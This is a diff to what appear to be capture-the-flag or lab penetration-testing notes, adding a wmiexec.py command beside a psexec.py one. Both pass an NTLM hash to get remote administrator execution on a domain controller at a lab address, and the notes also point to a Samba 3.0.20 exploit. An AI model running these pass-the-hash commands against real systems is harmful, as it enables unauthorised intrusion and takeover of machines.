@@ -78,6 +78,10 @@ Anonymous login successful
 
 ## PSEXEC
 - KALI: `./psexec.py -dc-ip 10.10.10.161 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 administrator@10.10.10.161`
+
+## WMIEXEC
+- KALI: `./wmiexec.py -dc-ip 10.10.10.161 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 administrator@10.10.10.161`
+
 - Samba 3.0.20 < 3.0.25rc3 **exploit**
 
 https://gist.github.com/joenorton8014/19aaa00e0088738fc429cff2669b9851
